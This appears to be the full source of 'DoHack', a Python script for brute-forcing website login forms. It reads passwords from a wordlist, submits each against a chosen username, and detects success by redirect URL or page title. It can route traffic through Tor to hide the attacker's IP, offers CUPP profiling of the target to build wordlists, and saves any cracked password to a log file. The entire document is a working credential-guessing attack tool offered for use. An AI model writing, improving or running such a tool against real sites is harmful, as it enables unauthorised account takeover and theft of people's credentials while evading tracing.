#!/usr/bin/env python
# -*- coding: utf-8 -*-

import mechanize
import sys
import os
import socks
import socket
import threading
import time
import click
from mechanize import Browser
from termcolor import colored, cprint



def banner():
    os.system("clear")
    print ('''
    ===================================================================

       ╔═╗   ╔═╗┬    ──┐ ┌─┐┬ ┬┌─┐┌┐ ┬ ┬
       ╠═╣   ║╣ │ ───┌─┘ ├─┤├─┤├─┤├┴┐└┬┘  @  DoHack
       ╩ ╩ o ╚═╝┴─┘  └── ┴ ┴┴ ┴┴ ┴└─┘ ┴

       follow me in my instagram : •´¯`•.   🎀  [𝑒𝑔𝓎.𝒿𝓈]  🎀   .•`¯´•

       Build By A.ELZAHABY github.com/el3zahaby

    ===================================================================
    ''')

def runer():

    os.system("sudo service tor reload")
    SOCKS_PROXY_HOST = '127.0.0.1'
    SOCKS_PROXY_PORT = 9050


    def create_connection(address, timeout=None, source_address=None):
        sock = socks.socksocket()
        sock.connect(address)
        return sock

    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, SOCKS_PROXY_HOST, SOCKS_PROXY_PORT)

    socket.socket = socks.socksocket
    socket.create_connection = create_connection
    brs = Browser()
    brs.set_handle_robots(False)
    response = brs.open('http://www.myexternalip.com/raw')
    ip =  response.read()
    print ("[DoH#] >>> now your using this ip  :" + ip)

def doHack(type,pwdwordlist = '',proxy = False):

    if (proxy == True):
        os.system("sudo service tor start")
        t1 = threading.Thread(target=runer)
        t1.start()
        t1.join()


    arr = dict();

    arr['website'] = raw_input('[DoH#] >>> Website Login page URL : ')
    arr['website_s'] = raw_input('[DoH#] >>> Website '+type+' URL after login successfully : ')
    arr['user'] = raw_input('[DoH#] >>> ID or Name of username input : ')
    arr['passw'] = raw_input('[DoH#] >>> ID or Name of password input : ')
    arr['email'] = raw_input("[DoH#] >>> Username or email : ")
    arr['file'] = pwdwordlist
    print("===================================================\n\n")
    with open(arr['file'],"r")as list:
            for line in list:
                word = line.strip()
                br = mechanize.Browser()
                br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
                br.set_handle_robots(False)

                br.open(arr['website'])
                br.select_form(nr=0)
                br.form[arr['user']] =arr['email']
                br.form[arr['passw']]= word
                sub = br.submit()

                resultAfterSub =  type=="redirect" and sub.geturl() or ((type=="title") and br.title() or "CANCELE")
                if resultAfterSub == arr['website_s']:
                    print('==============================')

                    outputFile = os.path.expanduser("~/Desktop")+"/"+word+"-"+arr['email']+".log"
                    targetfilefound = open(outputFile, 'w')
                    targetfilefound.write('password: '+ word+'\n\n user: '+ arr['email'])
                    cprint('[DoH#] >>> You will find the outputFile in:'+ colored(outputFile, 'green', 'on_red') +'\n', 'green', attrs=['bold'])


                    cprint('[DoH#] >>> This is Target password ==> '+word+ '\n', 'green', attrs=['bold'])

                    print('==============================')
                    exit()
                else:
                    cprint ('[DoH#] >>> This is not your  Password ==>'+word,'red')

banner()
try:
    print ("1) To Start Attack using Redirect URL")
    print ("2) To Start Attack using Redirect URL + with Auto Proxy")
    print ("3) To Start Attack Using title of Website")
    print ("4) To Start Attack Using title of Website + with auto Proxy")
    print ("5) update [DoHack] tool")
    choice = int(raw_input("[DoH#] >>> "))
    if choice ==5:
        banner()
        cprint ('[DoH#] >>> Do Update','green')

        os.system('git pull origin master')
        os.system('bash -c "cd cupp/; git pull origin master"')
        exit()

    if click.confirm('Do you want to genrate a smart password wordlist?', default=True):
        #os.system('python3 cupp/cupp.py -h')
        banner()
        print ("1) Interactive questions for user password profiling")
        print ("2) Download huge wordlists from [Mebus/cupp] repository")
        cuppChoice = raw_input("[DoH#] >>> ")

        if cuppChoice == "1":
            os.system('python3 cupp/cupp.py -i')
        if cuppChoice == "2":
            os.system('python3 cupp/cupp.py -l')

        cuppwordlist = raw_input('\n\n[DoH#] >>> Your smart genrated wordlist file path/name in the RED :')
    else:
        cuppwordlist = raw_input('[DoH#] >>> Your wordlist file path/name :')

    if choice == 1:
        doHack('redirect',cuppwordlist)
        print('[DoH#] >>> Sorry Password not found ')
    if choice == 2:
        doHack('redirect',cuppwordlist,True)
        print('[DoH#] >>> Sorry Password not found ')
    if choice == 3:
        doHack('title',cuppwordlist)
        print('[DoH#] >>> Sorry Password not found ')
    if choice == 4:
        doHack('title',cuppwordlist,True)
        print('[DoH#] >>> Sorry Password not found ')
    else:
        print("[DoH#] >>> thanks Bye :) ")
except KeyboardInterrupt as e:
    print("EXIT")
    # quit
    sys.exit()
